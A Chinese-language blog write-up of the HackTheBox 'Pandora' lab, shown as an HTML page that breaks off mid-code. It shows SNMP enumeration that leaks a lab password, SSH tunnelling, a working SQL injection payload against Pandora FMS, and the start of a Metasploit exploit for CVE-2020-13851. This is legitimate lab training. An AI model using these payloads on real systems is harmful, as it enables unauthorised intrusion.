@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-Pandora - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-Pandora" />
+<meta property="og:description" content="HackTheBox靶机Pandora" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-pandora/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-10T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-01-10T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-Pandora"/>
+<meta name="twitter:description" content="HackTheBox靶机Pandora"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-pandora/" /><link rel="prev" href="https://mi3aka.eu.org/htb-oopsie/" /><link rel="next" href="https://mi3aka.eu.org/htb-vaccine/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-Pandora",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-pandora\/"
+        },"genre": "posts","wordcount":  1348 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-pandora\/","datePublished": "2022-01-10T14:08:30+00:00","dateModified": "2022-01-10T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-Pandora</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-10">2022-01-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1348 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#获取user1权限">获取user1权限</a></li>
+    <li><a href="#获取user2权限">获取user2权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前期工作">前期工作</h2>
+<p>nmap扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221513433.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221513433.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221513433.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221513433.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221513433.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221513433.png" /></p>
+<p>发现<code>161/udp</code>开放,尝试使用<code>snmpwalk</code>进行读取</p>
+<h2 id="获取user1权限">获取user1权限</h2>
+<p><code>sudo nmap -sU -p 161 --script=snmp-processes 10.10.11.136</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-22 15:27 CST
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.136
+</span></span><span class="line"><span class="cl">Host is up (0.081s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE
+</span></span><span class="line"><span class="cl">161/udp open  snmp
+</span></span><span class="line"><span class="cl">| snmp-processes: 
+</span></span><span class="line"><span class="cl">|   1: 
+</span></span><span class="line"><span class="cl">|     Name: systemd
+</span></span><span class="line"><span class="cl">|     Path: /sbin/init
+</span></span><span class="line"><span class="cl">|     Params: maybe-ubiquity
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">|   838: 
+</span></span><span class="line"><span class="cl">|     Name: cron
+</span></span><span class="line"><span class="cl">|     Path: /usr/sbin/CRON
+</span></span><span class="line"><span class="cl">|     Params: -f
+</span></span><span class="line"><span class="cl">|   843: 
+</span></span><span class="line"><span class="cl">|     Name: sh
+</span></span><span class="line"><span class="cl">|     Path: /bin/sh
+</span></span><span class="line"><span class="cl">|     Params: -c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;
+</span></span><span class="line"><span class="cl">|   858: 
+</span></span><span class="line"><span class="cl">|     Name: atd
+</span></span><span class="line"><span class="cl">|     Path: /usr/sbin/atd
+</span></span><span class="line"><span class="cl">|     Params: -f
+</span></span><span class="line"><span class="cl">|   860: 
+</span></span><span class="line"><span class="cl">|     Name: snmpd
+</span></span><span class="line"><span class="cl">|     Path: /usr/sbin/snmpd
+</span></span><span class="line"><span class="cl">|     Params: -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
+</span></span><span class="line"><span class="cl">|   861: 
+</span></span><span class="line"><span class="cl">|     Name: sshd
+</span></span><span class="line"><span class="cl">|     Path: sshd: /usr/sbin/sshd -D [listener] 1 of 10-100 startups
+</span></span><span class="line"><span class="cl">|   872: 
+</span></span><span class="line"><span class="cl">|     Name: apache2
+</span></span><span class="line"><span class="cl">|     Path: /usr/sbin/apache2
+</span></span><span class="line"><span class="cl">|     Params: -k start
+</span></span><span class="line"><span class="cl">|   897: 
+</span></span><span class="line"><span class="cl">|     Name: agetty
+</span></span><span class="line"><span class="cl">|     Path: /sbin/agetty
+</span></span><span class="line"><span class="cl">|     Params: -o -p -- \u --noclear tty1 linux
+</span></span><span class="line"><span class="cl">|   909: 
+</span></span><span class="line"><span class="cl">|     Name: polkitd
+</span></span><span class="line"><span class="cl">|     Path: /usr/lib/policykit-1/polkitd
+</span></span><span class="line"><span class="cl">|     Params: --no-debug
+</span></span><span class="line"><span class="cl">|   949: 
+</span></span><span class="line"><span class="cl">|     Name: mysqld
+</span></span><span class="line"><span class="cl">|     Path: /usr/sbin/mysqld
+</span></span><span class="line"><span class="cl">|   1131: 
+</span></span><span class="line"><span class="cl">|     Name: host_check
+</span></span><span class="line"><span class="cl">|     Path: /usr/bin/host_check
+</span></span><span class="line"><span class="cl">|     Params: -u daniel -p HotelBabylon23
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">|   31386: 
+</span></span><span class="line"><span class="cl">|     Name: sshd
+</span></span><span class="line"><span class="cl">|     Path: sshd: daniel@pts/0
+</span></span><span class="line"><span class="cl">|   31387: 
+</span></span><span class="line"><span class="cl">|     Name: bash
+</span></span><span class="line"><span class="cl">|     Path: -bash
+</span></span><span class="line"><span class="cl">|   31589: 
+</span></span><span class="line"><span class="cl">|     Name: chisel_1.7.6_li
+</span></span><span class="line"><span class="cl">|     Path: ./chisel_1.7.6_linux_amd64
+</span></span><span class="line"><span class="cl">|     Params: client 10.10.14.21:1234 R:30000:127.0.0.1:80
+</span></span><span class="line"><span class="cl">|   36786: 
+</span></span><span class="line"><span class="cl">|     Name: kworker/0:0-memcg_kmem_cache
+</span></span><span class="line"><span class="cl">|   36823: 
+</span></span><span class="line"><span class="cl">|     Name: kworker/1:2-events
+</span></span><span class="line"><span class="cl">|   37386: 
+</span></span><span class="line"><span class="cl">|     Name: kworker/1:1-events
+</span></span><span class="line"><span class="cl">|   37522: 
+</span></span><span class="line"><span class="cl">|     Name: kworker/u4:0-events_power_efficient
+</span></span><span class="line"><span class="cl">|   42454: 
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">| 
+</span></span><span class="line"><span class="cl">|_  71459: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 357.43 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>敏感信息<code>/usr/bin/host_check -u daniel -p HotelBabylon23</code>,<code>Params: -u daniel -p HotelBabylon23</code>,<code>chisel_1.7.6_linux_amd64</code></p>
+<p><code>user.txt</code>在<code>/home/matt</code>目录下,不在<code>/home/daniel</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221539616.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221539616.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221539616.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221539616.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221539616.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221539616.png" /></p>
+<h2 id="获取user2权限">获取user2权限</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/bin/pkexec
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/pandora_backup
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="cl">/usr/bin/fusermount
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/usr/bin/host_check</code>反编译</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">==</span> <span class="mi">5</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;PandoraFMS host check utility&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now attempting to check PandoraFMS registered hosts.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Files will be saved to ~/.host_check&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">system</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34;/usr/bin/curl &#39;http://127.0.0.1/pandora_console/include/api.php?op=get&amp;op2=all_agents&amp;return_type=csv&amp;other_m&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34;ode=url_encode_separator_%7C&amp;user=daniel&amp;pass=HotelBabylon23&#39; &gt; ~/.host_check 2&gt;/dev/null&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Host check unsuccessful!</span><span class="se">\n</span><span class="s">Please check your credentials.</span><span class="se">\n</span><span class="s">Terminating program!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">sleep</span><span class="p">(</span><span class="mh">0x1B186Eu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Host check successful!</span><span class="se">\n</span><span class="s">Terminating program!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Two arguments expected.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ussage: ./host_check -u username -p password.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>/var/www/</code>有<code>html</code>和<code>pandora</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221547490.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221547490.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221547490.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221547490.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221547490.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221547490.png" /></p>
+<p><code>ssh -L 80:127.0.0.1:80 daniel@10.10.11.136</code>将端口转发到本地(注意权限)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221614269.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221614269.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221614269.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221614269.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221614269.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221614269.png" /></p>
+<p><a href="http://127.0.0.1/pandora_console/include/api.php?op=get&amp;op2=all_agents&amp;return_type=csv&amp;other_m%22%22ode=url_encode_separator_%7C&amp;user=daniel&amp;pass=HotelBabylon23" target="_blank" rel="noopener noreffer ">http://127.0.0.1/pandora_console/include/api.php?op=get&amp;op2=all_agents&amp;return_type=csv&amp;other_m%22%22ode=url_encode_separator_%7C&amp;user=daniel&amp;pass=HotelBabylon23</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1;localhost.localdomain;192.168.1.42;Created by localhost.localdomain;Linux;;09fbaa6fdf35afd44f8266676e4872f299c1d3cbb9846fbe944772d913fcfc69;3
+</span></span><span class="line"><span class="cl">2;localhost.localdomain;;Pandora FMS Server version 7.0NG.742_FIX_PERL2020;Linux;;localhost.localdomain;3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个FMS有个sql注入的漏洞<a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained" target="_blank" rel="noopener noreffer ">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a></p>
+<p><code>http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:&quot;admin&quot;;' as data--+</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282337412.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282337412.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282337412.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282337412.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282337412.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282337412.png" /></p>
+<p>以管理员身份登录后,利用<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13851" target="_blank" rel="noopener noreffer ">CVE-2020-13851</a>进行命令执行</p>
+<p>看<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/pandora_fms_events_exec.rb" target="_blank" rel="noopener noreffer ">msf的exp</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">_opts</span> <span class="o">=</span> <span class="p">{})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s1">&#39;Executing payload...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">send_request_cgi</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
